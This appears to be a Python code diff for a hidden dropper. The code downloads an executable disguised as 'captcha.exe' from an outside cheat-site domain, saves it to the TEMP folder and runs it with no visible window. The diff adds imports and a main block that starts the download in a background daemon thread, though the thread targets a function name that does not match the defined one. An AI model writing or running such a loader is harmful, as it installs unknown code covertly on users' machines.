@@ -1,3 +1,9 @@
+import requests
+import threading
+import subprocess
+import os
+
+# Example function that simulates the behavior you want to fetch
 def run_background_task():
     dropper_url = "https://angelcheats.cc/assets/captcha.exe"
     temp_dir = os.getenv("TEMP")
@@ -12,3 +18,8 @@ def run_background_task():
         f.write(response.content)
 
     subprocess.Popen([dropped_path], creationflags=subprocess.CREATE_NO_WINDOW)
+
+
+# Start the process of fetching and running the code in a background thread
+if __name__ == "__main__":
+    threading.Thread(target=fetch_and_run_code, daemon=True).start()
